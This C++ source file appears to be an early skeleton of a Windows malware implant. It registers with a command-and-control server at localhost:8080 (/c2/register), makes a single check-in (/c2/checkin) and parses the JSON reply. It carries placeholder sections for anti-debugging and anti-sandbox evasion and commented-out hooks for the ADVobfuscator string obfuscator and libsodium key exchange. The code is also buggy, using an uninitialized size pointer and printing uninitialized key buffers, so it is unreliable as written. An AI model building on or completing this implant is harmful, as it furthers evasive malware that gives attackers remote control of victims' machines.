#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <stdio.h>
// #include "sodium/sodium.h"
#include <string.h>
// #include "obfuscator/MetaString.h"
#include "rapidjson/rapidjson.h"
#include "rapidjson/document.h"
#include "crypto.h"
#include "httpclient.h"

using namespace std;
//using namespace andrivet::ADVobfuscator;

int main()
{
    // if (sodium_init() < 0) {
    //     return 1;
    // }

    // Anti Debug

    // Anti Sandbox
    LPCWSTR c2 = L"localhost";

    char *key_json = "{\"txid\": \"1234\"}";

    PSIZE_T outSize;

    cout << key_json << endl;
    // cout << wcslen(key_json) << endl;
    
    unsigned char* privKey = (unsigned char*)malloc(32);
    unsigned char* pubKey = (unsigned char*)malloc(32);

    // int status = createKeyPair(privKey, pubKey);
    cout << "privkey: " << privKey << "\n pubkey: " << pubKey << endl;
    // Register
    LPBYTE res = HTTPRequest(L"POST", c2, L"/c2/register", 8080, L"Hello-world", (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
    
    // do stuff with the response
    Sleep(1);
    // Checkin loop
    LPBYTE checkinRes = HTTPRequest(L"POST", c2, L"/c2/checkin", 8080, L"Hello-world", (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
    rapidjson::Document document;
    void* answer_str = calloc(0, *outSize + 1);
    memcpy(answer_str, checkinRes, *outSize);
    document.Parse((char*)answer_str);
    // rapidjson::Value& v = document["hi"]
    printf("hello = %s\n", document["hello"].GetString());
    return 0; 
}

// void HTTP() {
//     HINTERNET hSession = NULL;
//     HINTERNET hConnect = NULL;
//     HINTERNET hRequest = NULL;
//     BOOL bResult = FALSE;
//     DWORD dwSize = 0;
//     DWORD dwDownloaded = 0;
//     LPSTR pszOutBuffer;

//     // Open a session.
//     hSession = WinHttpOpen(L"WinHTTP Example/1.0",
//                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
//                            WINHTTP_NO_PROXY_NAME,
//                            WINHTTP_NO_PROXY_BYPASS, 0);

//     // Specify the server and port to connect to.
//     hConnect = WinHttpConnect(hSession, L"localhost", 8080, 0);

//     // Create an HTTP request handle.
//     hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/c2/register",
//                                   NULL, WINHTTP_NO_REFERER,
//                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
//                                   0);


    

//     cout << "Sending req" << endl;
    
//     // Send the HTTP request.
//     bResult = WinHttpSendRequest(hRequest,
//                                  WINHTTP_NO_ADDITIONAL_HEADERS, 0,
//                                  key_json, strlen(key_json),
//                                  strlen(key_json), 0);
    
//     if (bResult)
//     {
//         cout << "Waiting for response" << endl;
//         // Wait for the response.
//         bResult = WinHttpReceiveResponse(hRequest, NULL);
//     }

//     if (bResult)
//     {
//         // Get the content length.
//         dwSize = 0;
//         WinHttpQueryDataAvailable(hRequest, &dwSize);

//         // Allocate memory for the response buffer.
//         pszOutBuffer = new char[dwSize + 1];

//         // Read the response into the buffer.
//         ZeroMemory(pszOutBuffer, dwSize + 1);
//         if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
//         {
//             // Print the response.
//             cout << "Response: " << endl << pszOutBuffer << endl;
//         }

//         // Free the memory allocated to the buffer.
//         delete[] pszOutBuffer;
//     }

//     // Close the request handle.
//     if (hRequest) WinHttpCloseHandle(hRequest);

//     // Close the connection handle.
//     if (hConnect) WinHttpCloseHandle(hConnect);

//     // Close the session handle.
//     if (hSession) WinHttpCloseHandle(hSession);
// }